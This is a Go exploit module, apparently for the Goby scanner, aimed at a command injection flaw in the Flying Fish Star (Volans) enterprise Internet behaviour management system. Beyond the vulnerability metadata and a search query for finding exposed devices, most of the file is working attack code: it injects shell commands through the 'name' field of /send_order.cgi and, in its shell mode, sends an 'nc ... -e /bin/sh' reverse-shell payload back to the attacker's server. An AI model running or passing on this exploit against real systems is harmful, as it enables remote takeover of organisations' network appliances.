package exploits

import (
	"fmt"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Flying Fish Star Enterprise Intelligent Internet Behavior Management System /send_order.cgi? Parameter=operation Command Execution Vulnerability",
    "Description": "<p>Flying Fish Star's enterprise-level intelligent Internet behavior management system is used to monitor, manage and control the online behavior of employees within the enterprise to ensure network security, improve work efficiency and comply with the company's network use policy.</p><p>There is a command execution vulnerability in the Flying Fish Star enterprise-level intelligent Internet behavior management system. The attacker can use /send_order.cgi? Parameter=operation to obtain system permissions</p>",
    "Product": "Volans-Ent-Intelligent-Wireless-IBMS",
    "Homepage": "http://www.adslr.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-04-02",
    "Author": "兰公子",
    "FofaQuery": "title==\"飞鱼星企业级智能上网行为管理系统\"",
    "GobyQuery": "title==\"飞鱼星企业级智能上网行为管理系统\"",
    "Level": "2",
    "Impact": "<p>There is a command execution vulnerability in the Flying Fish Star enterprise-level intelligent Internet behavior management system. The attacker can use /send_order.cgi? Parameter=operation to obtain system permissions</p>",
    "Recommendation": "<p>At present, there is no detailed solution. Please pay attention to the update of the manufacturer's homepage: <a href=\"http://www.adslr.com/\">http://www.adslr.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "command,shell",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/send_order.cgi?parameter=operation",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{\"opid\":\"1\",\"name\":\";echo ;echo ;echo test;\",\"type\":\"rest\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "飞鱼星企业级智能上网行为管理系统 /send_order.cgi?parameter=operation 命令执行漏洞",
            "Product": "飞鱼星企业级智能无线上网行为管理系统",
            "Description": "<p>飞鱼星企业级智能上网行为管理系统用于监控、管理和控制企业内部员工的上网行为，以确保网络安全、提高工作效率和遵守公司的网络使用政策。<br></p><p>飞鱼星企业级智能上网行为管理系统存在命令执行漏洞，攻击者可通过/send_order.cgi?parameter=operation获取系统权限<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.adslr.com/\">http://www.adslr.com/</a><br></p>",
            "Impact": "<p>飞鱼星企业级智能上网行为管理系统存在命令执行漏洞，攻击者可通过/send_order.cgi?parameter=operation获取系统权限<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Flying Fish Star Enterprise Intelligent Internet Behavior Management System /send_order.cgi? Parameter=operation Command Execution Vulnerability",
            "Product": "Volans-Ent-Intelligent-Wireless-IBMS",
            "Description": "<p>Flying Fish Star's enterprise-level intelligent Internet behavior management system is used to monitor, manage and control the online behavior of employees within the enterprise to ensure network security, improve work efficiency and comply with the company's network use policy.</p><p>There is a command execution vulnerability in the Flying Fish Star enterprise-level intelligent Internet behavior management system. The attacker can use /send_order.cgi? Parameter=operation to obtain system permissions</p>",
            "Recommendation": "<p>At present, there is no detailed solution. Please pay attention to the update of the manufacturer's homepage: <a href=\"http://www.adslr.com/\">http://www.adslr.com/</a><br></p>",
            "Impact": "<p>There is a command execution vulnerability in the Flying Fish Star enterprise-level intelligent Internet behavior management system. The attacker can use /send_order.cgi? Parameter=operation to obtain system permissions<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10940"
}`

	// 正则匹配(输入：表达式 , 内容)
	makeRegularasfDD := func(RegularContent string, RegularUrl string) (string, error) {
		log.Println(RegularContent)
		reRequestasfDD := regexp.MustCompile(RegularUrl)
		if !reRequestasfDD.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestasfDD.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	// POST请求构造(请求url , data参数 , header参数(map))
	sendPayloadFlagPostKash := func(hostInfo *httpclient.FixUrl, urlOfPost string, dataOfPost string, postHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		postRequestConfigKash := httpclient.NewPostRequestConfig(urlOfPost)
		postRequestConfigKash.VerifyTls = false
		postRequestConfigKash.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range postHeaderMap {
			postRequestConfigKash.Header.Store(postHeaderKey, postHeaderValue)
		}
		postRequestConfigKash.Data = dataOfPost
		return httpclient.DoHttpRequest(hostInfo, postRequestConfigKash)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			command := goutils.B2S(ss.Params["command"])

			if ss.Params["AttackType"].(string) == "command" {
				getSecResultOfMap := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
				cfg, err := sendPayloadFlagPostKash(expResult.HostInfo, "/send_order.cgi?parameter=operation", `{"opid":"1","name":";echo ;echo ;echo on;`+command+`;echo end;","type":"rest"}`, getSecResultOfMap)
				if err != nil {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				pathOfThePostasfDD, err := makeRegularasfDD(cfg.Utf8Html, `on\s+(.*?)\s+end`)
				if err == nil {
					expResult.Success = true
					expResult.Output += "命令已成功执行,结果为：\n" + pathOfThePostasfDD
					return expResult
				}
			}

			if ss.Params["AttackType"].(string) == "shell" {
				getSecResultOfMap := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
				cfg, _ := sendPayloadFlagPostKash(expResult.HostInfo, "/send_order.cgi?parameter=operation", `{"opid":"1","name":";echo ;echo ;uname -a;","type":"rest"}`, getSecResultOfMap)
				if strings.Contains(cfg.Utf8Html, "Linux") {
					waitSessionCh := make(chan string)
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
						log.Println("[WARNING] godclient bind failed", err)
					} else {
						ip := godclient.GetGodServerIP()
						cmd := `nc ` + ip + ` ` + rp + ` -e /bin/sh`

						getSecResultOfMap := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
						go sendPayloadFlagPostKash(expResult.HostInfo, "/send_order.cgi?parameter=operation", `{"opid":"1","name":";`+cmd+`;","type":"rest"}`, getSecResultOfMap)

						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							}
						case <-time.After(time.Second * 15):
						}
					}
					return expResult
				}
			}
			expResult.Success = false
			expResult.Output = "利用失败"
			return expResult
		},
	))
}
